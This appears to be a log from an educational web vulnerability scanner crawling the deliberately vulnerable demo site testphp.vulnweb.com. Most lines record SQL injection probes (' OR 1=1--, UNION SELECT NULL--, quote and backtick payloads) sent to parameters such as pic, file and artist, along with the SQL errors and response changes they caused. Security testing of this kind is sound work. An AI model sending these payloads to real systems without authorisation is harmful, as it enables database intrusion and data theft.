+2025-11-06 11:11:46,070 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27%29--
+2025-11-06 11:11:46,071 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27%29--
+2025-11-06 11:11:46,871 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+UNION+SELECT+NULL--
+2025-11-06 11:11:46,872 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+UNION+SELECT+NULL--
+2025-11-06 11:11:47,638 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+1%3D1--
+2025-11-06 11:11:47,639 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+OR+1%3D1--
+2025-11-06 11:11:48,406 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+1%3D1--
+2025-11-06 11:11:48,406 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22+OR+1%3D1--
+2025-11-06 11:11:49,254 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
+2025-11-06 11:11:51,337 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27
+2025-11-06 11:11:52,288 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:11:53,104 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22
+2025-11-06 11:11:54,055 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:11:55,021 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%60
+2025-11-06 11:11:55,904 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27%29--
+2025-11-06 11:11:56,705 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:11:57,571 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%27+OR+1%3D1--
+2025-11-06 11:11:58,519 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F5.jpg%22+OR+1%3D1--
+2025-11-06 11:11:59,334 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=7
+2025-11-06 11:12:00,935 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27
+2025-11-06 11:12:00,936 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27
+2025-11-06 11:12:01,886 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+%271%27%3D%271
+2025-11-06 11:12:01,887 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+OR+%271%27%3D%271
+2025-11-06 11:12:02,686 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22
+2025-11-06 11:12:02,687 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22
+2025-11-06 11:12:03,469 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+%221%22%3D%221
+2025-11-06 11:12:03,470 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22+OR+%221%22%3D%221
+2025-11-06 11:12:04,286 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%60
+2025-11-06 11:12:04,287 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%60
+2025-11-06 11:12:05,119 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27%29--
+2025-11-06 11:12:05,120 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27%29--
+2025-11-06 11:12:06,052 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+UNION+SELECT+NULL--
+2025-11-06 11:12:06,053 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+UNION+SELECT+NULL--
+2025-11-06 11:12:06,902 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%27+OR+1%3D1--
+2025-11-06 11:12:06,903 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%27+OR+1%3D1--
+2025-11-06 11:12:07,803 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=7%22+OR+1%3D1--
+2025-11-06 11:12:07,803 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=7%22+OR+1%3D1--
+2025-11-06 11:12:08,600 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
+2025-11-06 11:12:10,685 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27
+2025-11-06 11:12:11,652 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:12:12,619 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22
+2025-11-06 11:12:13,585 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:12:14,525 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%60
+2025-11-06 11:12:15,485 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27%29--
+2025-11-06 11:12:16,450 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:12:17,284 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%27+OR+1%3D1--
+2025-11-06 11:12:18,201 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg%22+OR+1%3D1--
+2025-11-06 11:12:19,001 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=6
+2025-11-06 11:12:20,599 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27
+2025-11-06 11:12:20,600 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27
+2025-11-06 11:12:21,368 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+%271%27%3D%271
+2025-11-06 11:12:21,368 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+OR+%271%27%3D%271
+2025-11-06 11:12:22,216 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22
+2025-11-06 11:12:22,217 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22
+2025-11-06 11:12:23,166 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+%221%22%3D%221
+2025-11-06 11:12:23,167 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22+OR+%221%22%3D%221
+2025-11-06 11:12:24,131 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%60
+2025-11-06 11:12:24,133 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%60
+2025-11-06 11:12:25,083 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27%29--
+2025-11-06 11:12:25,083 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27%29--
+2025-11-06 11:12:25,860 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+UNION+SELECT+NULL--
+2025-11-06 11:12:25,860 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+UNION+SELECT+NULL--
+2025-11-06 11:12:26,681 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%27+OR+1%3D1--
+2025-11-06 11:12:26,681 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%27+OR+1%3D1--
+2025-11-06 11:12:27,465 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=6%22+OR+1%3D1--
+2025-11-06 11:12:27,465 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=6%22+OR+1%3D1--
+2025-11-06 11:12:28,249 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
+2025-11-06 11:12:30,147 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27
+2025-11-06 11:12:30,941 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:12:31,712 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22
+2025-11-06 11:12:32,481 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:12:33,263 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%60
+2025-11-06 11:12:34,063 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27%29--
+2025-11-06 11:12:35,013 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:12:35,963 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%27+OR+1%3D1--
+2025-11-06 11:12:36,757 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F6.jpg%22+OR+1%3D1--
+2025-11-06 11:12:37,548 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=1
+2025-11-06 11:12:39,163 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27
+2025-11-06 11:12:39,163 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27
+2025-11-06 11:12:40,129 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+%271%27%3D%271
+2025-11-06 11:12:40,130 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+%271%27%3D%271
+2025-11-06 11:12:40,895 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22
+2025-11-06 11:12:40,895 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22
+2025-11-06 11:12:41,730 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+%221%22%3D%221
+2025-11-06 11:12:41,730 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+%221%22%3D%221
+2025-11-06 11:12:42,497 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%60
+2025-11-06 11:12:42,497 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%60
+2025-11-06 11:12:43,313 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27%29--
+2025-11-06 11:12:43,313 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27%29--
+2025-11-06 11:12:44,128 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-06 11:12:44,128 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-06 11:12:45,092 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+1%3D1--
+2025-11-06 11:12:45,093 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%27+OR+1%3D1--
+2025-11-06 11:12:45,863 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+1%3D1--
+2025-11-06 11:12:45,863 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=1%22+OR+1%3D1--
+2025-11-06 11:12:46,661 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=2
+2025-11-06 11:12:48,261 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27
+2025-11-06 11:12:48,261 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27
+2025-11-06 11:12:49,063 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+%271%27%3D%271
+2025-11-06 11:12:49,063 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+%271%27%3D%271
+2025-11-06 11:12:49,879 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22
+2025-11-06 11:12:49,879 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22
+2025-11-06 11:12:50,678 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+%221%22%3D%221
+2025-11-06 11:12:50,678 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+%221%22%3D%221
+2025-11-06 11:12:51,462 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%60
+2025-11-06 11:12:51,462 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%60
+2025-11-06 11:12:52,261 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27%29--
+2025-11-06 11:12:52,261 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27%29--
+2025-11-06 11:12:53,044 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-06 11:12:53,044 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-06 11:12:53,861 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+1%3D1--
+2025-11-06 11:12:53,861 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%27+OR+1%3D1--
+2025-11-06 11:12:54,676 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+1%3D1--
+2025-11-06 11:12:54,676 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=2%22+OR+1%3D1--
+2025-11-06 11:12:55,477 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=3
+2025-11-06 11:12:57,025 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27
+2025-11-06 11:12:57,025 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27
+2025-11-06 11:12:57,878 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+%271%27%3D%271
+2025-11-06 11:12:57,878 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+%271%27%3D%271
+2025-11-06 11:12:58,649 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22
+2025-11-06 11:12:58,649 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22
+2025-11-06 11:12:59,476 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+%221%22%3D%221
+2025-11-06 11:12:59,476 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+%221%22%3D%221
+2025-11-06 11:13:00,273 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%60
+2025-11-06 11:13:00,274 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%60
+2025-11-06 11:13:01,078 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27%29--
+2025-11-06 11:13:01,078 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27%29--
+2025-11-06 11:13:01,877 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-06 11:13:01,877 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-06 11:13:02,677 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+1%3D1--
+2025-11-06 11:13:02,677 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%27+OR+1%3D1--
+2025-11-06 11:13:03,491 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+1%3D1--
+2025-11-06 11:13:03,492 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?artist=3%22+OR+1%3D1--
+2025-11-06 11:13:04,458 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+2025-11-06 11:13:22,242 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251106T054322Z.json', 'csv': 'reports\\edu_scan_report_20251106T054322Z.csv', 'html': 'reports\\edu_scan_report_20251106T054322Z.html', 'pdf': 'reports\\edu_scan_report_20251106T054322Z.pdf'}
+2025-11-06 14:15:29,684 INFO: Crawled: http://testphp.vulnweb.com (1)
+2025-11-06 14:15:30,511 INFO: Crawled: http://testphp.vulnweb.com/index.php (2)
+2025-11-06 14:15:31,493 INFO: Crawled: http://testphp.vulnweb.com/categories.php (3)
+2025-11-06 14:15:32,520 INFO: Crawled: http://testphp.vulnweb.com/artists.php (4)
+2025-11-06 14:15:33,439 INFO: Crawled: http://testphp.vulnweb.com/disclaimer.php (5)
+2025-11-06 14:15:34,370 INFO: Crawled: http://testphp.vulnweb.com/cart.php (6)
+2025-11-06 14:15:35,281 INFO: Crawled: http://testphp.vulnweb.com/guestbook.php (7)
+2025-11-06 14:15:36,198 INFO: Crawled: http://testphp.vulnweb.com/AJAX/index.php (8)
+2025-11-06 14:15:37,236 INFO: Crawled: http://testphp.vulnweb.com/login.php (9)
+2025-11-06 14:15:38,570 INFO: Crawled: http://testphp.vulnweb.com/userinfo.php (10)
+2025-11-06 14:15:40,495 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (11)
+2025-11-06 14:15:41,430 INFO: Crawled: http://testphp.vulnweb.com/hpp/ (12)
+2025-11-06 14:15:42,349 INFO: Crawled: http://testphp.vulnweb.com/search.php?test=query (13)
+2025-11-06 14:15:43,247 INFO: Crawled: http://testphp.vulnweb.com/style.css (14)
+2025-11-06 14:15:44,086 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=1 (15)
+2025-11-06 14:15:45,119 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=2 (16)
+2025-11-06 14:16:04,884 INFO: Crawled: http://testphp.vulnweb.com (1)
+2025-11-06 14:16:05,697 INFO: Crawled: http://testphp.vulnweb.com/index.php (2)
+2025-11-06 14:16:06,599 INFO: Crawled: http://testphp.vulnweb.com/categories.php (3)
+2025-11-06 14:16:07,439 INFO: Crawled: http://testphp.vulnweb.com/artists.php (4)
+2025-11-06 14:16:08,358 INFO: Crawled: http://testphp.vulnweb.com/disclaimer.php (5)
+2025-11-06 14:16:09,270 INFO: Crawled: http://testphp.vulnweb.com/cart.php (6)
+2025-11-06 14:16:10,196 INFO: Crawled: http://testphp.vulnweb.com/guestbook.php (7)
+2025-11-06 14:16:11,224 INFO: Crawled: http://testphp.vulnweb.com/AJAX/index.php (8)
+2025-11-06 14:16:12,045 INFO: Crawled: http://testphp.vulnweb.com/login.php (9)
+2025-11-06 14:16:13,179 INFO: Crawled: http://testphp.vulnweb.com/userinfo.php (10)
+2025-11-06 14:16:14,804 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (11)
+2025-11-06 14:16:15,624 INFO: Crawled: http://testphp.vulnweb.com/hpp/ (12)
+2025-11-06 14:16:16,396 INFO: Crawled: http://testphp.vulnweb.com/search.php?test=query (13)
+2025-11-06 14:16:17,268 INFO: Crawled: http://testphp.vulnweb.com/style.css (14)
+2025-11-06 14:16:18,082 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=1 (15)
+2025-11-06 14:16:19,017 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=2 (16)
+2025-11-06 14:16:20,034 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=3 (17)
+2025-11-06 14:16:20,949 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=4 (18)
+2025-11-06 14:16:21,885 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=1 (19)
+2025-11-06 14:16:22,805 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=2 (20)
+2025-11-06 14:16:23,718 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=3 (21)
+2025-11-06 14:16:24,639 INFO: Crawled: http://testphp.vulnweb.com/AJAX/styles.css (22)
+2025-11-06 14:16:25,565 INFO: Crawled: http://testphp.vulnweb.com/signup.php (23)
+2025-11-06 14:16:26,486 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (24)
+2025-11-06 14:16:27,491 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (25)
+2025-11-06 14:16:28,529 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (26)
+2025-11-06 14:16:29,333 INFO: Crawled: http://testphp.vulnweb.com/hpp/?pp=12 (27)
+2025-11-06 14:16:30,181 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=1 (28)
+2025-11-06 14:16:31,885 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg (29)
+2025-11-06 14:16:32,733 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=2 (30)
+2025-11-06 14:16:33,671 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg (31)
+2025-11-06 14:16:34,680 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=3 (32)
+2025-11-06 14:16:35,501 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg (33)
+2025-11-06 14:16:36,426 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=4 (34)
+2025-11-06 14:16:37,877 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg (35)
+2025-11-06 14:16:38,863 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=5 (36)
+2025-11-06 14:16:40,223 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg (37)
+2025-11-06 14:16:41,128 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=7 (38)
+2025-11-06 14:16:42,468 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg (39)
+2025-11-06 14:16:43,258 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=6 (40)
+2025-11-06 14:16:44,412 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg (41)
+2025-11-06 14:16:45,217 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=1 (42)
+2025-11-06 14:16:46,022 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=2 (43)
+2025-11-06 14:16:46,960 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=3 (44)
+2025-11-06 14:16:47,969 INFO: Crawled: http://testphp.vulnweb.com/secured/newuser.php (45)
+2025-11-06 14:16:48,784 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/ (46)
+2025-11-06 14:16:49,680 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html (47)
+2025-11-06 14:16:50,484 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/ (48)
+2025-11-06 14:16:51,273 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html (49)
+2025-11-06 14:16:52,065 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/ (50)
+2025-11-06 14:16:52,897 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html (51)
+2025-11-06 14:16:53,683 INFO: Crawled: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12 (52)
+2025-11-06 14:16:54,532 INFO: Crawled: http://testphp.vulnweb.com/secured/style.css (53)
+2025-11-10 11:17:11,113 INFO: Crawled: http://testphp.vulnweb.com/ (total 1)
